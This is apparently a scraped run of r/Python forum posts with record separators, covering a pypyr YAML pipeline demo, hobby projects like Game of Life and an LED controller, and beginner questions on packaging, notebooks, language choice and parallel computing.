The pypyr automation tool helps with that. It's always been open-source, but I've never particularly publicized it all that much, even though myself and a few contributors been adding features over the years to make it even more useful.

&amp;#x200B;

You automate things by putting them in an easy to write &amp; read yaml pipeline like this:

&amp;#x200B;

    # ./show-me-what-you-got.yaml
    context_parser: pypyr.parser.keyvaluepairs
    steps:
      - name: pypyr.steps.echo
        in:
          echoMe: o hai!
      - name: pypyr.steps.cmd
        in:
          cmd: echo any cmd you like
      - name: pypyr.steps.shell
        in:
          cmd: echo ninja shell power | grep '^ninja.*r$' 
      - name: pypyr.steps.py
        in:
          pycode: print('any python you like')
      - name: pypyr.steps.cmd
        while:
          max: 3
        in:
          cmd: echo gimme a {whileCounter}
      - name: pypyr.steps.cmd
        foreach: [once, twice, thrice]
        in:
          cmd: echo say {i}
      - name: pypyr.steps.default
        in:
          defaults:
            sayBye: False
      - name: pypyr.steps.echo
        run: '{sayBye}'
        in:
          echoMe: k bye!

&amp;#x200B;

Notice that we're jumping between cli commands, custom python, setting default values, reading input from the cli and selectively running the last step to say "bye" depending on what a cli input argument is. 

  
You can then run this like so:

&amp;#x200B;

    $ pypyr show-me-what-you-got
    o hai!
    any cmd you like
    ninja shell power
    any python you like
    gimme a 1
    gimme a 2
    gimme a 3
    say once
    say twice
    say thrice
    
    $ pypyr show-me-what-you-got sayBye=true  
    o hai!
    any cmd you like
    ninja shell power
    any python you like
    gimme a 1
    gimme a 2
    gimme a 3
    say once
    say twice
    say thrice
    k bye!

&amp;#x200B;

You can use this as a library programatically from your own code too - the API is undemanding and clearly documented!  


I just made a new documentation website for it here [https://pypyr.io](https://pypyr.io), which I'm pretty excited about. . .  Feedback much appreciated!

Mods please remove if necessary.

TL;DR : I would like some ideas about how to use programming skills to make an impact outside of work.

I am in my late 20s, with a Masters degree in Comp. Eng and a Bachelor in Physics. Python was my first real language and I am pretty competent in C++ and some niche langs like Prolog and Lisp in there too.

All of my work experience so far has been unskilled (food service, labour) because that's all I can get. Perhaps its just bad luck, socioeconomic conditioning or whatever.  Every month I grow more disillusioned with the job search, and at this point I don't even know if I want to work in the industry anymore. Everything about it just seems to rub me the wrong way.

What can I do with my programming skills to make an impact on the world? 

Working on toy projects is fun and all, but it doesn't really fill in the lack of meaning. I'm not really into teaching and hacktivism just seems... stupid... in 2020 (had some friends get arrested 8 years ago for this). 

What do YOU do? How do YOU contribute to your community, country, etc? 

Any ideas are welcome.

Working on an application that I started in a notebook because that was where I am comfortable working. Self taught courses were data science based as well as the intro python course was in a notebook since its a good teaching tool as well. 

My scripts are getting very long though, lots of function definitions and I even was forced to get over my resistance to classes to keep things organized. The notebook is absolutely feeling tedious now though so I am going to move everything over to sublime. 

My question is that I am feeling lost as so far I have just really been doing notebooks and now I need to understand how to organize all the information into a project file. Going from a linear workflow to one with parallel scripts saved and functions or classes defined outside the logic script seems daunting and I could use any advice on where I might be able to find resources to aid in best practice and general work flow.

I have decent experience in python and C/C++, but I have no experience with C modules in Python or Cython, so I thought this would be a great opportunity. So I decided to use librsync instead of just implementing rsync in pure python.

I am just looking for some tips and guidance. When people do things like this, do they package the library alongside python packages? Should I package librsync alongside my program? What's the best practice.

Is there a way where if the end user does not have a C compiler, I can fall back to the pure python implementation of rsync if I do provide it as an alternative?

If I am providing an alternative pure python implementation anyway, can't I just do the C module thing only if the user already has librsync installed (using the package manager or something)

Are there projects that do these things and are considered well written/packaged so that I can follow their general guidelines depending on which option I end up taking?""|||Aldous Broder Maze Generation Visualization|||Python|||1|||9|||1600144336|||""Things I really like are visualizing stuff.

2) calculate all features mean such as:

    from scipy import mean
    o= list(map(lambda x: mean(all_features_score[x]), all_features_score))
    print('all_features_score=\n', all_features_score)
    all_features_mean = sum(o)/len(o)
    print ('all_features_mean=\n' , all_features_mean)
    
    it give all_features_mean:
    all_variables_mean=
     0.598772045718575
    &lt;class 'numpy.float64'&gt;

3) divided each feature given in step1 by all\_features\_mean find step 2 .

how can i do it in python 3? i hope it is clear to be understand.

[Github](https://github.com/000Nobody/Conways-Game-Of-Life)

Conway's Game of Life is a zero-player game created in 1970 by mathematician John Horton Conway. The rules are as follows:

1. Any live cell with fewer than two live neighbors dies, as if by underpopulation.
2. Any live cell with two or three live neighbors lives on to the next generation.
3. Any live cell with more than three live neighbors dies, as if by overpopulation.
4. Any dead cell with exactly three live neighbors becomes a live cell, as if by reproduction.

In the version I made, the controls are:

|Left Click|Add living cells (can only be done in pause)|
|:-|:-|
|Right Click|Remove living cells (can only be done in pause)|
|Space|Play/Pause|
|C|Clear all living cells (can only be done in pause)|
|G|Toggle grid|

With those rules, you can make a bunch of really cool patterns and contraptions.

There's a more in-depth demo video at [https://www.youtube.com/watch?v=1a16lYx2mZE](https://www.youtube.com/watch?v=1a16lYx2mZE)

There's a short demo in the beginning and a longer guided demo near the second half.

This project is a Flask App hosted on a Raspberry Pi which controls some WS2812b LEDs. It's a simple project and something I'm still working on. I'm hoping to do a v2.0 in the coming months with more improvements.

**Backend**: Flask and I run a simple python watchdog script that looks for updates to a comma-separated text file. When a change is detected, it parses that file to run the visualization on the lights. 

**Frontend**: Basic HTML/CSS (Bootstrap) and JavaScript (jQuery). I want to turn it into a ReactJS app at some point since I'm learning React and it would be good practice. It's all fronted by Apache so that I don't have to worry about CORS or anything.

This would be a really good way to test your LEDs and connections. The project comes with an install script that will install most of the dependencies for you. The only thing it skips is the Flask set up and apache config set up. I haven't figured out a good way to create a virtual environment with the install script and do a whole bunch of things in there yet.

You can find the code on GitHub: [https://github.com/naztronaut/FCW](https://github.com/naztronaut/FCW)

Get more info as well as a written guide at [https://www.easyprogramming.net/raspberrypi/flask\_controlled\_ws2812b.php](https://www.easyprogramming.net/raspberrypi/flask_controlled_ws2812b.php)

I include connection diagrams as well, although these LEDs are pretty simple since it's just power, ground, and data pins.

Plans for future versions include:

* Control each individual LED from the app
* Maybe set up MQTT or a DB to store the data instead of a comma-separated text file
* More visualizations
* More thorough Install script

As someone who is relatively knew to both Python and Java I'm just now deciding which language I want to explore deeper into.

As far as I can tell from my research the main benefits to Python are that

1. It is very user friendly, and
2. There are lots of modules available that are interesting to experiment with.

However, admittedly, I am drawn more to learning Java. As a general consensus it seems to be:

1. much faster
2. heavily embedded in the industry

I hear from various sources online that Java seems to be on the way out and Python on the way in but I don't know if that's actually the case? I can't imagine, due to how heavily used Java is, that it is going anywhere anytime soon.

Another thing everyone talks about is dynamically typed vs. statically typed. Perhaps it was just because I started with Java but I feel far more comfortable using a statically typed language over Python. Am I missing out on something here or do other people feel the same?

Also, just in terms of future job possibilities and the use of Python in the industry I would assume that Java or even C / C++ would be more likely to propagate throughout the future just because of the speed? Or am I just over exaggerating how important the speed of the application actually is?

Any opinions you have on this question are greatly appreciated :)

I started with Python about three months ago and this is my first bigger project. Many thanks to my coach Sven, who helped me a lot with bugfixing and some of the more difficult numpy functions.

I used pygame for the interface and numpy for some mathematical stuff like coordinates.

**The features are:**

\- Moving arround (for example to see further planets )

\- Speed-Changes

\- Show and hide information stuff like orbits, menues and names

\- Destroy planets (or the sun)

\- Create own planets with own speed, ow mass and own distance.

**The simulation is further able to:**

\- Simulate gravitational forces

\- Simulate collissions

\- Draw the orbits and the previous movement of the planets

**The biggest programming-chalenges where**

\- Drawing the orbit with acceptable performance, especially after the user updated the picture.

\- Implementing the creation-functions. I had to simplyfy on a few places to keep a good overview.

I tried pyglet but it is pretty hard to start with and I did not find any other library that could satisfy my requirements.I am looking for a library for animation purpouses (mainly 2D) but I haven't been able to find something that is not orientated for games developing, also, many of the libraries that people recommend are out of date or are not maintained anymore.

First of all thank you for reading.

I have a project during my PhD and although I have figure out how to do this in Matlab easily I was wondering if there is a way to implement this in Python and what tools I should use.

I will try to keep it short.

I have some PCs at my lab that I want to use in parallel. ( I would prefer if this is implemented on Windows but Linux(Ubuntu) works as well, it just a smaller amount of PCs I can use in Linux(Ubuntu)

Every PC (Host) must run some Workers depending on their CPU and RAM ( Each PC has different CPU and RAM). Every worker is assigned with a script and must run it independently and asynchronously. Meaning that every time its script it completed one answer is provided back to the master host and another is assigned to the worker.

My script is a model I made and it is provided to the worker with different variables. It is evaluated and returning the results to the main script running on the Master Host.



In Matlab this is an easy task to implement using Matlab Parallel Server. A job scheduler is running to the Master Host and assign the jobs (My script) to the workers that running in the Hosts on the same network.

Is there a way to implement my process in an easy way such as Matlab and what tools should I use?""|||Help I can't seem to get this program right !|||Python|||1|||2|||1599889836|||""[removed]""|||Difference between the two codes below|||Python|||1|||2|||1599889065|||""[removed]""|||Issues with Wolframalpha API in discord.py|||Python|||1|||2|||1599887125|||""[removed]""|||I made bfs visualization using pygame|||Python|||1|||5|||1599886584|||""To see visualization Youtube: [https://youtu.be/LF1h-8bEjP0](https://youtu.be/LF1h-8bEjP0)

Several options exist to deal with these events, including automatic execution of any method which starts with ref\_ and finishes with the name of that particular item. The RefLabel can be set to hold multiple selections at once, or just one per click, as well as many other customizations.
